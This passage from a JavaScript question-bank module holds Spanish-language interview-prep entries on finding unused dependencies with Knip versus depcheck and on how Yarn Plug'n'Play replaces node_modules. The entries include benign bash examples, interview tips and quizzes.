        "response": "Con el paso del tiempo y las refactorizaciones, los proyectos acumulan **dependencias muertas** (librerías instaladas en `package.json` que ya no son importadas en ningún archivo) o **exportaciones huérfanas** que inflan el tamaño de la instalación y aumentan la superficie de ataque.\n\n### Knip vs Depcheck:\n- **`depcheck`**: Herramienta clásica que analiza llamadas a `require()` o `import` contra las listas de `package.json`. Sin embargo, suele arrojar falsos positivos con configuraciones modernas (plugins de Vite, configs de Tailwind, TS declaration files).\n- **`knip` (El estándar moderno de alto rendimiento)**:\n  - Analiza de forma holística todo el grafo del proyecto utilizando el compilador de TypeScript.\n  - Detecta **dependencias no utilizadas** tanto en `dependencies` como `devDependencies`.\n  - Detecta **archivos no utilizados** (código muerto que nunca se importa).\n  - Detecta **exports y tipos huérfanos** (funciones exportadas que nadie consume fuera de su propio archivo).\n  - Soporta plugins nativos para Next.js, Vite, ESLint, Prettier y Vitest.",
        "codeExample": {
            "language": "bash",
            "code": "# 1. Ejecutar Knip en modo auditoría estricta\nnpx knip\n\n# Salida típica de detección de código muerto:\n# ----------------------------------------\n# Unused dependencies (2):\n#   lodash.debounce  package.json\n#   dayjs            package.json\n#\n# Unused devDependencies (1):\n#   @types/mocha     package.json\n#\n# Unused files (1):\n#   src/utils/legacy-formatter.ts\n#\n# Unused exports (1):\n#   calculateDiscount  src/services/billing.ts:42\n\n# 2. Configuración en knip.json para evitar falsos positivos:\n# {\n#   \"entry\": [\"src/index.ts!\", \"src/cli.ts!\"],\n#   \"project\": [\"src/**/*.ts!\"]\n# }"
        },
        "visualDiagram": {
            "id": "diag-pkg-19",
            "title": "Auditoría de Código Muerto y Dependencias con Knip",
            "caption": "Análisis estático integral del grafo de TypeScript para depurar dependencias huérfanas, archivos abandonados y exports no consumidos.",
            "diagramType": "pkg-depcheck-knip-dead-deps"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar que mantienes la higiene del repositorio activa mediante análisis estático continuo en CI para evitar bloatware de dependencias.",
            "commonPitfalls": [
                "Borrar una dependencia marcada por depcheck sin verificar si era consumida por un script de build en `package.json` o un binario en CI.",
                "Permitir que dependencias obsoletas sigan en el proyecto consumiendo tiempo de escaneo en security scanners."
            ],
            "followUps": [
                "¿Qué detecta Knip además de dependencias no usadas (exports y archivos muertos)?",
                "¿Cómo integrarías Knip en CI?"
            ]
        },
        "quiz": {
            "question": "¿Qué ventaja principal ofrece Knip frente a herramientas de detección de dependencias clásicas como depcheck?",
            "options": [
                "Knip compila el proyecto a binario WebAssembly",
                "Knip utiliza el compilador de TypeScript para auditar tanto dependencias huérfanas como archivos, tipos y exports no utilizados en todo el proyecto",
                "Knip solo funciona con Yarn Classic",
                "Knip elimina los paquetes directamente del disco sin pedir confirmación"
            ],
            "correctIndex": 1,
            "explanation": "Knip aprovecha el compilador de TypeScript y un sistema de plugins para realizar un análisis de grafo profundo, identificando dependencias huérfanas, exports no consumidos, tipos redundantes y archivos muertos."
        },
        "level": "experto"
    },
    {
        "title": "¿Qué es Yarn Plug'n'Play (PnP), cómo elimina la carpeta node_modules por completo y cuáles son sus tradeoffs?",
        "response": "**Yarn Plug'n'Play (PnP)** es una arquitectura radical introducida en Yarn Berry (v2+) que **erradica por completo la existencia de la carpeta `node_modules`**.\n\n### El Problema de `node_modules`:\nGenerar y recorrer `node_modules` exige que el sistema operativo realice millones de llamadas a la API de sistema de archivos (`stat`, `readdir`, `read`) debido al algoritmo de resolución ascendente de Node.js (que busca recursivamente en `../node_modules`, `../../node_modules` hasta la raíz del disco).\n\n### Cómo Funciona Yarn PnP:\n1. **Paquetes comprimidos en ZIP**: Cada dependencia se descarga y almacena como un único archivo `.zip` comprimido e inmutable dentro de `.yarn/cache/`.\n2. **El Archivo `.pnp.cjs`**: En vez de copiar millones de archivos a carpetas físicas, Yarn genera un mapa estático en un único archivo JavaScript (`.pnp.cjs`) que contiene las coordenadas exactas de cada paquete en disco y su grafo de dependencias.\n3. **Parche del Resolver de Node.js**: Mediante un hook de ejecución (`node -r ./.pnp.cjs`), Yarn intercepta la función nativa `require()` e `import` de Node. Cuando el código solicita `import 'react'`, PnP lee directamente el zip en memoria sin realizar búsquedas I/O costosas en disco.\n\n### Tradeoffs y Desafíos:\n- **Ventajas**: Instalaciones prácticamente instantáneas (cero I/O), compatibilidad con Zero-Installs (commitear el caché zip a Git), y fin de las dependencias fantasma.\n- **Desventajas**: Incompatibilidad con herramientas que asumen la existencia física de rutas en disco (algunos loaders legacy de Webpack, React Native Metro o binarios C++ sin soporte PnP).",
        "codeExample": {
            "language": "bash",
            "code": "# 1. Inicializar proyecto con Yarn Berry PnP (sin node_modules):\nyarn init -2\nyarn add react react-dom\n\n# Estructura de archivos generada:\n# .yarn/\n# ├── cache/\n# │   ├── react-npm-18.2.0-a1b2c3.zip\n# │   └── react-dom-npm-18.2.0-d4e5f6.zip\n# └── releases/yarn-4.1.1.cjs\n# .pnp.cjs     <-- Tabla estática de resolución de rutas en zips\n\n# 2. Ejecutar la aplicación inyectando el resolver PnP:\nyarn node src/index.js\n\n# 3. Integración con IDEs (VSCode requiere sdk para entender rutas en zips):\nyarn dlx @yarnpkg/sdks vscode"
        },
        "visualDiagram": {
            "id": "diag-pkg-20",
            "title": "Arquitectura Yarn Plug'n'Play (PnP): Cero node_modules",
            "caption": "Mapeo estático en .pnp.cjs y resolución de paquetes directamente desde archivos zip inmutables en caché.",
            "diagramType": "pkg-yarn-pnp-plug-and-play"
        },
        "interviewTips": {
            "whatInterviewersWant": "Explicar el concepto de Zero-Installs, cómo `.pnp.cjs` intercepta el resolver de Node.js para leer zips directamente y reconocer los tradeoffs con ecosistemas como React Native.",
            "commonPitfalls": [
                "Intentar usar Yarn PnP en proyectos de React Native sin verificar si Metro y los autolinkings nativos soportan zips.",
                "Creer que PnP es solo un alias de symlinks; en realidad elimina las carpetas de node_modules y opera sobre archivos comprimidos."
            ],
            "followUps": [
                "¿Qué problemas de compatibilidad tiene PnP con herramientas que leen node_modules?",
                "¿Qué son los Zero-Installs?"
            ]
        },
        "quiz": {
            "question": "¿Cómo resuelve Node.js las importaciones de librerías en un proyecto configurado con Yarn Plug'n'Play (PnP)?",
            "options": [
                "Descarga los archivos a /tmp cada vez que se hace un import",
                "Intercepta require/import mediante un hook provisto por .pnp.cjs que mapea las rutas directamente a ficheros .zip inmutables en caché",
                "Crea millones de enlaces duros en la carpeta node_modules oculta",
                "Requiere compilar todo el código con Webpack antes de correr en Node"
            ],
            "correctIndex": 1,
            "explanation": "Yarn PnP inyecta un hook en el runtime de Node.js a través del archivo .pnp.cjs que sustituye el algoritmo clásico de resolución ascendente de directorios por lecturas directas en memoria de los archivos zip inmutables."
        },
        "level": "experto"
    }
]
};

export default questionsPackageManager;
